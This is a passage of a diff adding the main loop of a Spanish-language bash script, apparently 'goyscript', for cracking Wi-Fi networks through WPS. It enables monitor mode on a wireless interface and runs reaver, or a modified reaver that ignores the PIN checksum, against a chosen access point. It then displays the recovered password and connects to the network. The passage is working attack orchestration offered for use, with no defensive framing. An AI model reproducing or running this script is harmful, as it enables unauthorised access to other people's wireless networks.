+	if [ "$LISTA" != "" ] && [ -f "./$WPS_TMP/redes_wps_sin_titulo.lst" ]
+	then
+		echo -e $cyanC"Se usará la lista de redes detectadas anteriormente."$grisC
+		echo
+		sleep 1
+	else
+		buscar_redes_wps
+	fi
+else
+	DESDE_DATOS="SI"
+	MAC_AP="$2"
+	NOMBRE_AP="$3"
+	CANAL="$4"
+	INTERFAZ="$5"
+	MAC_GUIONES=`echo "$MAC_AP" | sed 's/:/-/g'`
+	MAC_AP_3PARES=`echo "$MAC_AP" | cut -c-8`
+fi
+nohup software/./restaurar_servicios.sh $$ >/dev/null 2>&1 & #inicia en segundo plano el script para restaurar los servicios al finalizar goyscript
+while true
+do
+	if [ "$1" != "--datos" ]
+	then
+		seleccionar_red_wps
+	fi
+
+	INTERFACES_MONITOR=`iwconfig --version | grep "Recommend" | awk '{print $1}' | grep mon`
+	if [ "$INTERFACES_MONITOR" = "" ] #SE ACTIVA EL MODO MONITOR SI SE DESACTIVÓ PREVIAMENTE PARA CONECTARSE A INTERNET
+	then
+		echo -e $grisC
+		activar_modo_monitor
+	else
+		INTERFAZ_MONITOR=mon0
+	fi
+
+	hora_inicio
+
+	if [ "$1" != "--datos" ]
+	then
+		mostrar_resumen
+	fi
+
+	if [ ! -e "./$CLAVES/$NOMBRE_AP ($MAC_GUIONES).txt" ]
+	then
+		if [ -e "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).info" ]
+		then
+			CUMPLE_CHECKSUM=`sed -n 3p "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).info"`
+		else
+			MAC_CHECKSUM=`grep "$MAC_AP_3PARES" "$MACs_NOCHECKSUM"`
+			if [ "$MAC_CHECKSUM" = "" ]
+			then
+				CUMPLE_CHECKSUM="SI"
+			else
+				CUMPLE_CHECKSUM="NO" # SI ENCUENTRA LA MAC EN LA BASE DE DATOS ES PORQUE NO CUMPLE LA NORMA DEL CHECKSUM
+			fi
+		fi
+		if [ "$CUMPLE_CHECKSUM" = "SI" ]
+		then
+			iniciar_reaver
+			if [ -e "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).info" ]
+			then
+				CUMPLE_CHECKSUM=`sed -n 3p "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).info"`
+			else
+				CUMPLE_CHECKSUM="SI"
+			fi
+			if [ "$CUMPLE_CHECKSUM" = "NO" ]
+			then
+				echo -e $cyanC"Buscando segunda mitad del PIN omitiendo el dígito checksum..."
+				echo -e $grisC
+				iniciar_reavermod
+			fi
+		else
+			echo -e $rojoC"El AP seleccionado no cumple la norma de 7 dígitos + 1 checksum."
+			echo -e $grisC
+			echo -e $cyanC"Buscando PIN ignorando checksum..."
+			echo -e $grisC
+			iniciar_reavermod
+		fi
+	else
+		echo -e $magentaC"Contraseña obtenida anteriormente."
+		echo -e $grisC
+	fi
+	killall -q $REAVER $REAVERMOD > /dev/null 2>&1
+	hora_fin
+	calcular_tiempo
+	if [ -e "./$CLAVES/$NOMBRE_AP ($MAC_GUIONES).txt" ]
+	then
+		mostrar_password
+		mostrar_duracion
+		conectar_internet
+	else
+		echo -e $grisC
+		echo -e $rojoC"Se ha cancelado el proceso."
+		if [ -e "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).wps" ]
+		then
+			echo -e $verdeC
+			echo "Sesión guardada."
+		fi
+		echo -e $grisC
+		mostrar_duracion
+		echo -e $grisC
+		sleep 1
+	fi
+	borrar_temporales
+	pulsar_una_tecla "Pulsa una tecla para seleccionar otra red..."
+	if [ "$1" = "--datos" ]
+	then
+		exit 0
+	fi
+	echo -e $grisC
+done
